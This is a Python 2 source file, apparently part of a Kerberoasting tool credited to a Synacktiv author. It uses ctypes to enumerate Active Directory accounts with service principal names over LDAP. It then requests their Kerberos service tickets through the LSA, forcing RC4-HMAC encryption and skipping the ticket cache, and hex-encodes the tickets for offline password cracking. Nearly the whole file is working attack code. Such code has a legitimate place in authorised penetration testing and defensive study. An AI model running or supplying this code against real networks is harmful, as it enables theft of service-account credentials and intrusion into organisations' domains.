# ----------------------------------------------------------------------------
# "THE BEER-WARE LICENSE" (Revision 42):
# <jean-christophe.delaunay (at) synacktiv.com> wrote this file.  As long as you
# retain this notice you can do whatever you want with this stuff. If we meet
# some day, and you think this stuff is worth it, you can buy me a beer in
# return.   Fist0urs
# ----------------------------------------------------------------------------

#!/usr/bin/python

# -*- coding: utf-8 -*-

# by Fist0urs

from os.path import dirname

from ctypes import windll, cdll, memmove, cast, Structure, Union, addressof, byref, create_unicode_buffer, \
                   c_ubyte as UCHAR, c_wchar as wchar_t, c_wchar_p as PWSTR, POINTER, sizeof, \
                   c_void_p as PVOID, c_longlong as LONGLONG, c_ulonglong as ULONGLONG, c_char_p as PCHAR

from ctypes.wintypes import BOOL, DWORD, HANDLE, SHORT, USHORT, LONG, ULONG, BYTE

PUCHAR = POINTER(UCHAR)

LDAP_SUCCESS = 0
LDAP_VERSION3 = 3
LDAP_NO_LIMIT = 0
LDAP_PORT = 389
LDAP_AUTH_NEGOTIATE = (0x86 | 0x0400)
LDAP_OPT_PROTOCOL_VERSION = (0x11)
LDAP_OPT_SIZELIMIT = (0x03)
LDAP_OPT_TIMELIMIT = (0x04)
LDAP_SCOPE_SUBTREE = (0x02)

ANYSIZE_ARRAY = 1

STATUS_SUCCESS = 0x00000000

LsaConnectUntrusted = windll.secur32.LsaConnectUntrusted
LsaLookupAuthenticationPackage = windll.secur32.LsaLookupAuthenticationPackage
LsaCallAuthenticationPackage = windll.secur32.LsaCallAuthenticationPackage
LsaFreeReturnBuffer = windll.secur32.LsaFreeReturnBuffer

ldap_init = cdll.wldap32.ldap_init
ldap_set_option = cdll.wldap32.ldap_set_option
ldap_connect =  cdll.wldap32.ldap_connect
ldap_unbind = cdll.wldap32.ldap_unbind
ldap_unbind_s = cdll.wldap32.ldap_unbind
ldap_bind_s = cdll.wldap32.ldap_bind_s
ldap_search_s = cdll.wldap32.ldap_search_s
ldap_msgfree = cdll.wldap32.ldap_msgfree
ldap_count_entries = cdll.wldap32.ldap_count_entries
ldap_first_entry = cdll.wldap32.ldap_first_entry
ldap_next_entry = cdll.wldap32.ldap_next_entry
LdapGetLastError = cdll.wldap32.LdapGetLastError
ldap_first_attribute = cdll.wldap32.ldap_first_attribute
ldap_next_attribute = cdll.wldap32.ldap_next_attribute
ldap_get_values = cdll.wldap32.ldap_get_values
ldap_count_values = cdll.wldap32.ldap_count_values
ldap_value_free = cdll.wldap32.ldap_value_free
ldap_memfree = cdll.wldap32.ldap_memfree
ldap_msgfree = cdll.wldap32.ldap_msgfree
ber_free = cdll.wldap32.ber_free

class _SecHandle(Structure):
    _fields_ = [
        ('dwLower', ULONGLONG),
        ('dwUpper', ULONGLONG),
    ]
PSecHandle = POINTER(_SecHandle)
SecHandle = _SecHandle

class _LSA_UNICODE_STRING(Structure):
    _fields_ = [
        ('Length', USHORT),
        ('MaximumLength', USHORT),
        ('Buffer', PWSTR),
    ]
PLSA_UNICODE_STRING = POINTER(_LSA_UNICODE_STRING)
LSA_UNICODE_STRING = _LSA_UNICODE_STRING
UNICODE_STRING = LSA_UNICODE_STRING

class _LUID(Structure):
    _fields_ = [
        ('LowPart', DWORD),
        ('HighPart', LONG),
    ]
PLUID = POINTER(_LUID)
LUID = _LUID

class _KERB_RETRIEVE_TKT_REQUEST(Structure):
    _fields_ = [
        ('MessageType', DWORD),
        ('LogonId', LUID),
        ('TargetName', UNICODE_STRING),
        ('TicketFlags', ULONG),
        ('CacheOptions', ULONG),
        ('EncryptionType', LONG),
        ('CredentialsHandle', SecHandle),
    ]
PKERB_RETRIEVE_TKT_REQUEST = POINTER(_KERB_RETRIEVE_TKT_REQUEST)
KERB_RETRIEVE_TKT_REQUEST = _KERB_RETRIEVE_TKT_REQUEST

class _BIG_INTEGER(Structure):
    _fields_ = [
        ('LowPart', DWORD),
        ('HighPart', LONG),
    ]
PBIG_INTEGER = POINTER(_BIG_INTEGER)
BIG_INTEGER = _BIG_INTEGER

class _LARGE_INTEGER(Union):
    _fields_ = [
        ('u', BIG_INTEGER),
        ('QuadPart', LONGLONG),
    ]
PLARGE_INTEGER = POINTER(_LARGE_INTEGER)
LARGE_INTEGER = _LARGE_INTEGER

class _KERB_EXTERNAL_NAME(Structure):
    _fields_ = [
        ('NameType', SHORT),
        ('NameCount', USHORT),
        ('Names', UNICODE_STRING * ANYSIZE_ARRAY),
    ]
PKERB_EXTERNAL_NAME = POINTER(_KERB_EXTERNAL_NAME)
KERB_EXTERNAL_NAME = _KERB_EXTERNAL_NAME

class KERB_CRYPTO_KEY(Structure):
    _fields_ = [
        ('KeyType', LONG),
        ('Length', ULONG),
        ('Value', PUCHAR),
    ]
PKERB_EXTERNAL_TICKET = POINTER(KERB_CRYPTO_KEY)

class _KERB_EXTERNAL_TICKET(Structure):
    _fields_ = [
        ('ServiceName', PKERB_EXTERNAL_NAME),
        ('TargetName', PKERB_EXTERNAL_NAME),
        ('ClientName', PKERB_EXTERNAL_NAME),
        ('DomainName', UNICODE_STRING),
        ('TargetDomainName', UNICODE_STRING),
        ('AltTargetDomainName', UNICODE_STRING),
        ('SessionKey', KERB_CRYPTO_KEY),
        ('TicketFlags', ULONG),
        ('Flags', ULONG),
        ('KeyExpirationTime', LARGE_INTEGER),
        ('StartTime', LARGE_INTEGER),
        ('EndTime', LARGE_INTEGER),
        ('RenewUntil', LARGE_INTEGER),
        ('TimeSkew', LARGE_INTEGER),
        ('EncodedTicketSize', ULONG),
        ('EncodedTicket', PUCHAR),
    ]
PKERB_EXTERNAL_TICKET = POINTER(_KERB_EXTERNAL_TICKET)
KERB_EXTERNAL_TICKET = _KERB_EXTERNAL_TICKET


class _KERB_RETRIEVE_TKT_RESPONSE(Structure):
    _fields_ = [
        ('Ticket', KERB_EXTERNAL_TICKET),
    ]
PKERB_RETRIEVE_TKT_RESPONSE = POINTER(_KERB_RETRIEVE_TKT_RESPONSE)
KERB_RETRIEVE_TKT_RESPONSE = _KERB_RETRIEVE_TKT_RESPONSE

class _LDSB(Structure):
    _fields_ = [
        ('sb_sd', LONGLONG),
        ('Reserved1', UCHAR * ((10*sizeof(ULONG))+1)),
        ('sb_naddr', ULONGLONG),
        ('Reserved2', UCHAR * ((6*sizeof(ULONG))+1)),
    ]
PLDSB = POINTER(_LDSB)
LDSB = _LDSB

class _LDAP(Structure):
    _fields_ = [
        ('ld_sb', LDSB),
        ('ld_host', PCHAR),
        ('ld_version', ULONG),
        ('ld_lberoptions', UCHAR),
        ('ld_deref', ULONG),
        ('ld_timelimit', ULONG),
        ('ld_sizelimit', ULONG),
        ('ld_errno', ULONG),
        ('ld_matched', PCHAR),
        ('ld_error', PCHAR),
        ('ld_msgid', ULONG),
        ('Reserved3', UCHAR * ((6*sizeof(ULONG))+1)),
        ('ld_cldaptries', ULONG),
        ('ld_cldaptimeout', ULONG),
        ('ld_refhoplimit', ULONG),
        ('ld_options', ULONG),
    ]
PLDAP = POINTER(_LDAP)
LDAP = _LDAP

class _LDAPMSG(Structure):
    _fields_ = [
        ('lm_msgid', ULONG),
        ('lm_msgtype', ULONG),
        ('lm_ber', PVOID),
        ('lm_chain', PVOID),
        ('lm_next', PVOID),
        ('lm_time', ULONG),
        ('Connection', PLDAP),
        ('Request', PVOID),
        ('lm_returncode', ULONG),
        ('lm_referral', USHORT),
        ('lm_chased', BOOL),
        ('lm_eom', BOOL),
        ('ConnectionReferenced', BOOL),
    ]
PLDAPMSG = POINTER(_LDAPMSG)
LDAPMSG = _LDAPMSG

class berelement(Structure):
    _fields_ = [
        ('opaque', PCHAR),
    ]
PBerElement = POINTER(berelement)
BerElement = berelement


def ConnectToLDAP(pConnectionInformation):

    dwRes = ULONG(LDAP_SUCCESS)
    version = ULONG(LDAP_VERSION3)
    size = ULONG(LDAP_NO_LIMIT)
    time = ULONG(LDAP_NO_LIMIT)

    hLDAPConnection = ldap_init(pConnectionInformation, LDAP_PORT)

    if hLDAPConnection == 0:
        print "Impossible to connect to LDAP\n"
        return 0

    dwRes = ldap_set_option(hLDAPConnection, LDAP_OPT_PROTOCOL_VERSION, byref(version))

    if dwRes != LDAP_SUCCESS:
        print "Unable to set LDAP protocol option (ErrorCode: %d).\r\n" % dwRes
        if hLDAPConnection != 0:
            ldap_unbind(hLDAPConnection)
            return 0

    dwRes = ldap_set_option(hLDAPConnection, LDAP_OPT_SIZELIMIT, byref(size))

    if dwRes != LDAP_SUCCESS:
        print "Unable to set LDAP size limit option (ErrorCode: %d).\r\n" % dwRes
        if hLDAPConnection != 0:
            ldap_unbind(hLDAPConnection)
            return 0

    dwRes = ldap_set_option(hLDAPConnection, LDAP_OPT_TIMELIMIT, byref(time))

    if dwRes != LDAP_SUCCESS:
        print "Unable to set LDAP time limit option (ErrorCode: %d).\r\n" % dwRes
        if hLDAPConnection != 0:
            ldap_unbind(hLDAPConnection)
            return 0

    dwRes = ldap_connect(hLDAPConnection, 0);

    if dwRes != LDAP_SUCCESS:
        print "Unable to connect to LDAP server\n"
        if hLDAPConnection != 0:
            ldap_unbind(hLDAPConnection)
            return 0

    dwRes = ldap_bind_s(hLDAPConnection, 0, 0, LDAP_AUTH_NEGOTIATE);

    if dwRes != LDAP_SUCCESS:
        print "Unable to bind to LDAP server\n"
        if hLDAPConnection != 0:
            ldap_unbind(hLDAPConnection)
            return 0

    return cast(hLDAPConnection, PLDAP)


def LDAPsearch(hLDAPConnection, pMyDN, pMyFilter, pMyAttributes):
    KerberomResult = []
    pSearchResult = PLDAPMSG()

    errorCode = ldap_search_s(
            hLDAPConnection,
            pMyDN,
            LDAP_SCOPE_SUBTREE,
            pMyFilter,
            pMyAttributes,
            0,
            byref(pSearchResult))

    if errorCode != LDAP_SUCCESS:
        print "ldap_search_s failed with %d \n" % errorCode
        ldap_unbind_s(hLDAPConnection);
        if pSearchResult != 0:
            ldap_msgfree(pSearchResult);
            return 0;

    numberOfEntries = ldap_count_entries(
            hLDAPConnection,
            pSearchResult)

    if numberOfEntries == 0:
        print "ldap_count_entries failed with %d \n" % errorCode

        ldap_unbind_s(hLDAPConnection);
        if pSearchResult != 0:
            ldap_msgfree(pSearchResult);
            return 0;

    pEntry = PLDAPMSG()

    for iCnt in range(numberOfEntries):
        entry = {}
        if iCnt == 0:
            pEntry = ldap_first_entry(hLDAPConnection, pSearchResult)
        else:
            pEntry = ldap_next_entry(hLDAPConnection, pEntry)

        sMsg = "ldap_next_entry"
        if iCnt == 0:
            sMsg = "ldap_first_entry"

        if pEntry == 0:
            ldaperror = LdapGetLastError()
            print "%s failed with %d" % (sMsg, ldaperror)
            ldap_unbind_s(hLDAPConnection)
            ldap_msgfree(pSearchResult)
            return 0

        pBer = PBerElement()

        pAttribute = ldap_first_attribute(hLDAPConnection, pEntry, byref(pBer))

        ppValue = POINTER(PCHAR)

        while pAttribute != 0:
            ppValue = ldap_get_values(
                    hLDAPConnection,
                    pEntry,
                    pAttribute);

            if ppValue == 0:
                print "No attribute value returned"
            else:
                iValue = ldap_count_values(ppValue)
                if iValue == 0:
                    print "Bad value list"
                else:
                    pAttribute = cast(pAttribute, PCHAR)
                    ppValue = cast(ppValue, POINTER(PCHAR))

                    entry[pAttribute.value.lower()] = ppValue.contents.value

            if ppValue != 0:
                ldap_value_free(ppValue)
            ldap_memfree(pAttribute)

            pAttribute = ldap_next_attribute(hLDAPConnection, pEntry, pBer)

        KerberomResult.append(entry)
        if pBer != 0:
            ber_free(pBer, 0)

    ldap_unbind(hLDAPConnection)
    ldap_msgfree(pSearchResult)

    return KerberomResult


def KerberosInit():
    hLsaConnection = HANDLE()

    status = DWORD(0)
    LPTR = (0x0000 | 0x0040)
    MICROSOFT_KERBEROS_NAME_A = PWSTR()

    MICROSOFT_KERBEROS_NAME_A = windll.kernel32.LocalAlloc(LPTR, len("Kerberos") + 1)

    memmove(MICROSOFT_KERBEROS_NAME_A, "Kerberos", len("Kerberos"))

    status = LsaConnectUntrusted(byref(hLsaConnection))

    if status != STATUS_SUCCESS:
        print "LsaConnectUntrusted, cannot get LSA handle, error %d " % status
        windll.kernel32.LocalFree(MICROSOFT_KERBEROS_NAME_A)
        return None, None

    kerberosPackageName = UNICODE_STRING()
    kerberosPackageName.Length = USHORT(8)
    kerberosPackageName.MaximumLength = USHORT(9)
    kerberosPackageName.Buffer = MICROSOFT_KERBEROS_NAME_A

    dwKerberosAuthenticationPackageId = DWORD(0)
    status = LsaLookupAuthenticationPackage(hLsaConnection, byref(kerberosPackageName), byref(dwKerberosAuthenticationPackageId))

    windll.kernel32.LocalFree(MICROSOFT_KERBEROS_NAME_A)

    if status == STATUS_SUCCESS:
        return hLsaConnection, dwKerberosAuthenticationPackageId
    else:
        return None, None


def Get_TGS(hLsaConnection, dwKerberosAuthenticationPackageId, SPNentry):
    LPTR = (0x0000 | 0x0040)

    list_of_target = SPNentry["serviceprincipalname"].split(";")

    for target in list_of_target:
        szSPN = create_unicode_buffer(target.lower())
        dwSPNSize = USHORT((len(target)) * sizeof(wchar_t))

        dwTicketPayloadSize = DWORD(sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwSPNSize.value)

        KerbRetrieveEncodedTicketMessage = 8
        KERB_ETYPE_RC4_HMAC_NT = 23
        KERB_RETRIEVE_TICKET_DONT_USE_CACHE = (0x1)

        dwKerbRetrieveTicketRequestAddress = windll.kernel32.LocalAlloc(LPTR, dwTicketPayloadSize.value)
        pKerbRetrieveTicketRequest = cast(dwKerbRetrieveTicketRequestAddress, PKERB_RETRIEVE_TKT_REQUEST)

        pKerbRetrieveTicketRequest.contents.MessageType = KerbRetrieveEncodedTicketMessage
        # current logon session context
        pKerbRetrieveTicketRequest.contents.LogonID = 0
        # TargetName
        pKerbRetrieveTicketRequest.contents.TargetName.Length = USHORT(dwSPNSize.value)
        pKerbRetrieveTicketRequest.contents.TargetName.MaximumLength = USHORT(dwSPNSize.value + sizeof(wchar_t))

        dwKerbRetrieveTicketRequestBufferAddress = dwKerbRetrieveTicketRequestAddress + sizeof(KERB_RETRIEVE_TKT_REQUEST)
        memmove(dwKerbRetrieveTicketRequestBufferAddress, szSPN, pKerbRetrieveTicketRequest.contents.TargetName.Length)
        pKerbRetrieveTicketRequest.contents.TargetName.Buffer = cast(dwKerbRetrieveTicketRequestBufferAddress, PWSTR)

        pKerbRetrieveTicketRequest.contents.TicketFlags = ULONG(0)
        pKerbRetrieveTicketRequest.contents.CacheOptions = KERB_RETRIEVE_TICKET_DONT_USE_CACHE
        pKerbRetrieveTicketRequest.contents.EncryptionType = KERB_ETYPE_RC4_HMAC_NT
        pKerbRetrieveTicketRequest.contents.CredentialsHandle = SecHandle()

        pKerbRetrieveTicketResponse = PVOID()
        pKerbRetrieveTicketResponse = cast(pKerbRetrieveTicketResponse, PKERB_RETRIEVE_TKT_RESPONSE)
        dwProtocolStatus = DWORD(0)

        status = LsaCallAuthenticationPackage(hLsaConnection, dwKerberosAuthenticationPackageId, pKerbRetrieveTicketRequest, dwTicketPayloadSize, byref(pKerbRetrieveTicketResponse), byref(dwTicketPayloadSize), byref(dwProtocolStatus))

        windll.kernel32.LocalFree(pKerbRetrieveTicketRequest)

        if status == STATUS_SUCCESS and dwProtocolStatus.value == STATUS_SUCCESS and dwTicketPayloadSize.value != 0:
            pKerbRetrieveTicketResponse = cast(pKerbRetrieveTicketResponse, PKERB_RETRIEVE_TKT_RESPONSE)
            pEncodedTicket = pKerbRetrieveTicketResponse.contents.Ticket.EncodedTicket
            dwEncodedTicketSize = pKerbRetrieveTicketResponse.contents.Ticket.EncodedTicketSize

            Ticket = ""
            for i in range(dwEncodedTicketSize):
                Ticket += hex(pEncodedTicket[i]).replace("0x",'').zfill(2)

            LsaFreeReturnBuffer(pKerbRetrieveTicketResponse)

            return Ticket
        else:
            print " [-] Cannot retrieve ticket for account '%s' and SPN '%s', status: %s ; protocolstatus: %s" % (SPNentry["samaccountname"], target, hex(status), hex(dwProtocolStatus.value))
            print " [+] Trying the next one."
    print "[-] Could not retrieve any ticket for account '%s' and the list of SPN: '%s'" % (SPNentry["samaccountname"], SPNentry["serviceprincipalname"])
    return 0
